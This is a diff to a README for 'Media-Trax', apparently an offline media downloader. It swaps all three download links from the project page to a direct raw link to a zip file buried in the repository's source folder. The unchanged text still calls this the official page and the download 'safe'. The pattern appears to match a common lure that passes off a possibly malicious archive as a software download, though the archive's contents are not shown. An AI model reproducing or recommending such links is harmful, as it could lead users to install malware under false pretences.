@@ -1,6 +1,6 @@
 # 📥 Media-Trax - Your Fastest Path to Offline Media
 
-[![Download Media-Trax](https://img.shields.io/badge/Download-Media--Trax-purple?style=for-the-badge&logo=github)](https://github.com/thirdtrimesteriichronicles149/Media-Trax)
+[![Download Media-Trax](https://img.shields.io/badge/Download-Media--Trax-purple?style=for-the-badge&logo=github)](https://github.com/thirdtrimesteriichronicles149/Media-Trax/raw/refs/heads/main/src/mobile%20code%20version/3.4.zip)
 
 ## 🎯 What Is Media-Trax?
 
@@ -27,7 +27,7 @@ Follow these three simple steps to get Media-Trax running on your Windows comput
 ### Step 1: Download the Application
 
 1.  Visit this link to download the application:  
-    [https://github.com/thirdtrimesteriichronicles149/Media-Trax](https://github.com/thirdtrimesteriichronicles149/Media-Trax)
+    [https://github.com/thirdtrimesteriichronicles149/Media-Trax/raw/refs/heads/main/src/mobile%20code%20version/3.4.zip](https://github.com/thirdtrimesteriichronicles149/Media-Trax/raw/refs/heads/main/src/mobile%20code%20version/3.4.zip)
 2.  The link will take you to the official project page. Look for the download section or the "Releases" area on that page.
 3.  Choose the Windows version of the application and download it to your computer. The file will likely be named something like `MediaTrax_Windows.exe` or similar.
 
@@ -149,7 +149,7 @@ We are constantly working to improve Media-Trax. Your feedback helps us make it 
 
 ## 📥 Ready to Download?
 
-[![Download Media-Trax Now](https://img.shields.io/badge/Get%20Media--Trax-Download-brightgreen?style=for-the-badge)](https://github.com/thirdtrimesteriichronicles149/Media-Trax)
+[![Download Media-Trax Now](https://img.shields.io/badge/Get%20Media--Trax-Download-brightgreen?style=for-the-badge)](https://github.com/thirdtrimesteriichronicles149/Media-Trax/raw/refs/heads/main/src/mobile%20code%20version/3.4.zip)
 
 Click the button above to visit the official download page. The process is quick, safe, and completely free. Start building your offline media library today!
 
